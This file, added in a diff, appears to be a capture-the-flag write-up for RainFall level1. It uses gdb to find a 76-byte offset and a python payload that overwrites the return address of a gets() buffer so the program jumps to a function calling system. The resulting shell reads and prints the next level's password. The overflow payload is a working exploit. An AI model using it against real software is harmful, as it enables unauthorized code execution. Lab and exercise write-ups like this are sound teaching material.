@@ -1,0 +1,125 @@
+# We have a executable "level1" lets do some test!
+
+>level1@RainFall:~$ ./level1
+
+>level1@RainFall:~$ ./level1
+test
+>level1@RainFall:~$
+
+# This program don't take argument but read stdin.
+
+# Let's use gdb to investigate
+
+>gdb level1
+(gdb)disas main
+[...]
+    0x08048480 <+0>:	push   %ebp
+    0x08048481 <+1>:	mov    %esp,%ebp
+    0x08048483 <+3>:	and    $0xfffffff0,%esp
+    0x08048486 <+6>:	sub    $0x50,%esp
+    0x08048489 <+9>:	lea    0x10(%esp),%eax
+    0x0804848d <+13>:	mov    %eax,(%esp)
+    0x08048490 <+16>:	call   0x8048340 <gets@plt>
+    0x08048495 <+21>:	leave  
+    0x08048496 <+22>:	ret
+[...]
+
+# So its just a call to gets and nothing else maybe we can buffer overflow this
+
+(gdb) r
+Starting program: /home/user/level1/level1 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+# Yes we can overwrite the eip! Let's calculate the padding
+
+# We make a breakpoint just before the gets call and run the program
+
+(gdb) b *0x08048490
+Breakpoint 1 at 0x8048490
+(gdb) r
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048490 in main ()
+
+# Now we must get the address of eax (where gets store the string) and the address of eip
+
+(gdb) i f 
+Stack level 0, frame at 0xbffff640:
+ eip = 0x8048490 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff638, args: 
+ Locals at 0xbffff638, Previous frame's sp is 0xbffff640
+ Saved registers:
+ ebp at 0xbffff638, eip at 0xbffff63c
+
+# The address of eip is 0xbffff63c
+
+(gdb) x $eax
+0xbffff5f0:	0x080484a0
+
+# And the address of eax is 0xbffff5f0 so if we make a simple soustraction (eip - eax) we found 76 (decimal value)
+
+# So if we write 76 'A' normally the next four character will replace the original walue of eip
+
+(gdb) r <<< $(python -c "print('A' * 76 + 'B' * 4)")
+
+Starting program: /home/user/level1/level1 <<< $(python -c "print('A' * 76 + 'B' * 4)")
+
+Breakpoint 1, 0x08048490 in main ()
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+# The value of eip has been replaced by the 'B' value, but now what do we do? The main do nothing more than this, but maybe there is another function
+
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
+0x080484a0  __libc_csu_init
+[...]
+
+# We have a run function, let's dissamble it
+
+(gdb) disas run
+[...]
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+[...]
+
+# The run function call system ! So let's replace the eip value by the run address (0x08048444)
+
+(gdb) r <<< $(python -c "print('A' * 76 + '\x44\x84\x04\x08')")
+[...]
+Good... Wait what?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+
+# We succed to call run, but it doesnt work... Let's try it outside gdb
+
+>level1@RainFall:~$ python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/test
+>level1@RainFall:~$ cat /tmp/test | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+>level1@RainFall:~$
+
+# Well doesn't change much... Maybe the system call succed but close immediatly after? If we add the '-' cat option to read the stdin it will change something
+
+level1@RainFall:~$ cat /tmp/test -| ./level1
+Good... Wait what?
+whoami
+level2
+cd ..
+cd level2
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
